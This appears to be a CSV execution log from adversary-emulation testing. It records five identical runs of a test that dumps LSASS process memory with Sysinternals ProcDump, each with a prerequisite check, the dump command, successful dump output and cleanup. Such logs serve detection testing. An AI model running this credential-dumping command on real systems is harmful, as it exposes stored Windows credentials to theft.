command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:45:07.362533,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:45:21.544285,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:45:12] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:45:12] Dump 1 writing: Estimated dump file size is 129 MB.
[17:45:13] Dump 1 complete: 130 MB written in 0.4 seconds
[17:45:13] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:45:31.984209,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:46:24.924104,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:46:48.589171,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:46:30] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:46:30] Dump 1 writing: Estimated dump file size is 129 MB.
[17:46:30] Dump 1 complete: 130 MB written in 0.3 seconds
[17:46:31] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:47:02.318935,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:47:28.829775,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:47:52.335024,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:47:33] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:47:33] Dump 1 writing: Estimated dump file size is 129 MB.
[17:47:33] Dump 1 complete: 130 MB written in 0.3 seconds
[17:47:33] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:48:07.135327,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:49:54.947539,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:50:19.765405,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:49:59] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:50:00] Dump 1 writing: Estimated dump file size is 129 MB.
[17:50:00] Dump 1 complete: 130 MB written in 0.3 seconds
[17:50:00] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:50:29.822369,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:51:51.19759,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:52:04.326328,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:51:56] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:51:56] Dump 1 writing: Estimated dump file size is 129 MB.
[17:51:57] Dump 1 complete: 130 MB written in 0.4 seconds
[17:51:57] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:52:15.167465,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\procdump.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-03T21:53:18.133575,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],powershell,60,14,"Test Passed
"
"""C:\temp\ART\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
",2024-09-03T21:53:32.732079,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,"
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:53:24] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[17:53:24] Dump 1 writing: Estimated dump file size is 129 MB.
[17:53:24] Dump 1 complete: 130 MB written in 0.3 seconds
[17:53:24] Dump count reached.

"
"del ""C:\Windows\Temp\lsass_dump.dmp"" >nul 2> nul
",2024-09-03T21:53:43.633377,success,mythic,Dump LSASS.exe Memory using ProcDump,0be2230c-9ab3-4ac2-8826-3199b9a0ebf8,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying ""procdump.exe is not recognized as an internal or external command"", try using the  get-prereq_commands to download and install the ProcDump tool first.
",['windows'],shell,60,14,
